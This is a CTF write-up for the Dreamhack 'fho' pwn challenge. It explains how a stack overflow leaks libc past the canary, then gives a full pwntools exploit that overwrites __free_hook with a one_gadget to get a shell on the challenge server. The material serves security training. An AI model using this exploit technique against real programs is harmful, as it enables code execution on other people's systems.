+++
date = '2026-05-12'
draft = false
title = 'Dreamhack fho Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Exploit Tech: Hook Overwrite에서 실습하는 문제입니다.

---


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *ptr; // [rsp+0h] [rbp-50h] BYREF
  __int64 v5; // [rsp+8h] [rbp-48h] BYREF
  char buf[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100u);
  printf("Buf: %s\n", buf);
  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  __isoc99_scanf("%llu", &ptr);
  printf("With: ");
  __isoc99_scanf("%llu", &v5);
  printf("[%p] = %llu\n", ptr, v5);
  *(_QWORD *)ptr = v5;
  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  __isoc99_scanf("%llu", &ptr);
  free(ptr);
  return 0;
}
```

## Identifying the vulnerabilities

We get a stack buffer overflow, an arbitrary write and then an arbitrary free.

What would be nice would be a libc leak; we're also dealing with a canary here. At first, I leaked the canary and the value immediately after it (which was a PIE leak), but that wasn't of great use - so I added more `buf` data, to overwrite these two values (and a stack one which came right after), and we land on libc!

I calculated all the offsets for everything, but turns out I was using a different version of libc-2.27 locally, and I couldn't for the love of god find the 1.4 one available for download anywhere. 

On my version, the libc leak was at `__libc_start_main + 231`, so I just hoped that it stayed the same for the remote one. I found subtracted the 231, found it on blukat, and it confirmed my theory.

My idea was to overwrite `__free_hook` with a `one_gadget` and then free `__malloc_hook - 0x23` (since that's a valid free-able address). After I fixed the version, everything went smoothly, and I got the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/fho/fho')
libc = ELF('/home/kali/Downloads/dreamhack/fho/libc-2.27.so')
context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:19299'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p)
#ig canary  + rbp leak?
p.recvuntil(b": ")
payload = b"A"*56 + b"C"*8 + b"D"*7 + b"E"
p.send(payload)

p.recvuntil(b"E")

data = p.recv(6)
val = u64(data.ljust(8, b"\x00"))
print(f"found val, {hex(val)}")
#pie leak, looks like

#locally its libc_start_main + 231
#remotely different glibc version
#leak - 0x021b10 - 231
libc.address = val - 0x021b10 - 231
print(f"found libc, {hex(libc.address)}")

#now write into free_hook
p.recvuntil(b": ")
p.sendline(str(libc.sym[b'__free_hook']))

#value of overwrite
p.recvuntil(b": ")
one_gadget = libc.address + 0x4f432 #0x4f432  0x10a41c 0x4f3ce 0x4f3d5
p.sendline(str(one_gadget))

print(p.recvline())

#free arbitraty address; i think malloc_hook- 0x23 is fine
free_addr = libc.address + 0x3ebc0d
p.recvuntil(b": ")
p.sendline(str(free_addr))

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/fho.py)**.
